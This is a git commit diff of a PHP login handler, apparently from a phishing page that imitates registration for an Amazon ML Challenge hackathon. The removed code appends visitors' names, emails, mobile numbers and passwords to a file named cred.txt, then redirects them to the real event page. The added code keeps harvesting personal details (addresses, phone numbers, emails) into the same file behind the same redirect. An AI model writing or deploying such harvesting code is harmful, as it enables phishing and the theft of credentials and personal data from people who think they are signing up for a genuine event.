fe9c59db086f1036e7aa5949013a07ff67293cfa
Sachin Kumar Pandey <sachinkumarpandey1028@gmail.com>
2026-03-28 17:11:28 +0530

    login.php

--- login.php
+++ login.php
@@ -1,11 +1,21 @@
 <?php
-file_put_contents("cred.txt", 
-    "Name : " . $_POST['name'] . "\n" .
-    "Email : " . $_POST['email'] . "\n" .
-    "Mobile : " . $_POST['mobile'] . "\n" .
-    "Password : " . $_POST['password'] . "\n\n",
-    FILE_APPEND
-);
-header('Location: https://unstop.com/hackathons/amazon-ml-challenge-2025-amazon-1560375');
+
+$data = 
+"------ New Enquiry ------\n" .
+"Name: " . $_POST['name'] . "\n" .
+"Email: " . $_POST['email'] . "\n" .
+"Mobile: " . $_POST['mobile'] . "\n" .
+"Qualification: " . $_POST['qualification'] . "\n" .
+"City: " . $_POST['city'] . "\n" .
+"Source: " . $_POST['source'] . "\n" .
+"Address: " . $_POST['address'] . "\n" .
+"Notes: " . $_POST['notes'] . "\n" .
+"-------------------------\n\n";
+
+file_put_contents("cred.txt", $data, FILE_APPEND);
+
+// Redirect after submit
+header("Location: https://unstop.com/hackathons/amazon-ml-challenge-2025-amazon-1560375");
 exit();
+
 ?>
